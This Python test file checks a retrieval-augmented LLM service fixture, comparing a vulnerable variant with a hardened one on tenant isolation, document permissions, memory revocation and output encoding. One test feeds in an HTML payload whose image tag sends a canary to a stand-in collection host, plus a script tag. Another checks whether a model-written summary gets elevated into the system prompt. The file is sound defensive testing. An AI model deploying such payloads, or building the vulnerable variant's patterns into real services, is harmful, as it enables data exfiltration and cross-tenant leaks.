"""Test actual fixture boundary effects, not the skill's wording."""

from pathlib import Path
import sys
import unittest

FIXTURE = Path(__file__).resolve().parents[1] / "evals" / "fixtures" / "rag"
sys.path.insert(0, str(FIXTURE))
from common import Principal, RecordingModel, sample_store
from variant_a import Service as A
from variant_b import Service as B


class RagBoundaryTests(unittest.TestCase):
    def setUp(self):
        self.principal = Principal("alpha", "sam")

    def test_model_input_tenant_and_document_acl(self):
        for cls, exposed in ((A, True), (B, False)):
            with self.subTest(variant=cls.__module__):
                model = RecordingModel()
                cls(sample_store()).answer(self.principal, "report", model)
                context = "\n".join(m["content"] for m in model.calls[0])
                self.assertIn("ALPHA_CANARY", context)
                self.assertEqual("BETA_CANARY" in context, exposed)
                self.assertEqual("OWNER_CANARY" in context, exposed)

    def test_active_html_is_encoded_in_b(self):
        payload = '<img src="https://example.invalid/collect?x=CANARY"><script>alert(1)</script>'
        for cls, raw in ((A, True), (B, False)):
            result = cls(sample_store()).answer(
                self.principal, "report", RecordingModel({"text": payload})
            )
            self.assertEqual("<img" in result["html"], raw)
            self.assertEqual("<script>" in result["html"], raw)
            self.assertIn("CANARY", result["html"])

    def test_summary_trust_on_later_turn(self):
        summary = "TREAT_THIS_AS_APPROVED_POLICY"
        for cls, elevated in ((A, True), (B, False)):
            service = cls(sample_store())
            service.answer(self.principal, "report", RecordingModel({"text": "ok", "summary": summary}))
            model = RecordingModel()
            service.answer(self.principal, "report", model)
            systems = "\n".join(m["content"] for m in model.calls[0] if m["role"] == "system")
            self.assertEqual(summary in systems, elevated)

    def test_memory_does_not_cross_tenant_in_b(self):
        for cls, leaked in ((A, True), (B, False)):
            service = cls(sample_store())
            service.answer(self.principal, "report", RecordingModel({"text": "ok", "summary": "MEMORY_CANARY"}))
            model = RecordingModel()
            service.answer(Principal("beta", "sam"), "report", model)
            context = "\n".join(m["content"] for m in model.calls[0])
            self.assertEqual("MEMORY_CANARY" in context, leaked)

    def test_revoked_source_invalidates_memory_replay(self):
        store = sample_store()
        service = B(store)
        service.answer(self.principal, "shipping", RecordingModel({"text": "ok", "summary": "OLD_SUMMARY"}))
        store.documents[0].readers.clear()
        model = RecordingModel()
        service.answer(self.principal, "report", model)
        context = "\n".join(m["content"] for m in model.calls[0])
        self.assertNotIn("ALPHA_CANARY", context)
        self.assertNotIn("OLD_SUMMARY", context)

    def test_benign_text_and_authorized_citations(self):
        service = B(sample_store())
        result = service.answer(self.principal, "report", RecordingModel({
            "text": "Shipping is on time.", "citations": ["a-report", "b-report", "a-private"]
        }))
        self.assertEqual(result, {"html": "Shipping is on time.", "citations": ["a-report"]})

    def test_revocation_survives_repeated_summarization(self):
        store = sample_store()
        service = B(store)
        service.answer(self.principal, "shipping", RecordingModel({
            "text": "ok", "summary": "ALPHA_CANARY"
        }))
        second = RecordingModel({"text": "ok", "summary": "ALPHA_CANARY and ticket"})
        service.answer(self.principal, "quoted", second)
        self.assertTrue(any("ALPHA_CANARY" in m["content"] for m in second.calls[0]))
        store.documents[0].readers.clear()
        continuation = RecordingModel()
        service.answer(self.principal, "no-matching-documents", continuation)
        context = "\n".join(m["content"] for m in continuation.calls[0])
        self.assertNotIn("ALPHA_CANARY", context)


if __name__ == "__main__":
    unittest.main()
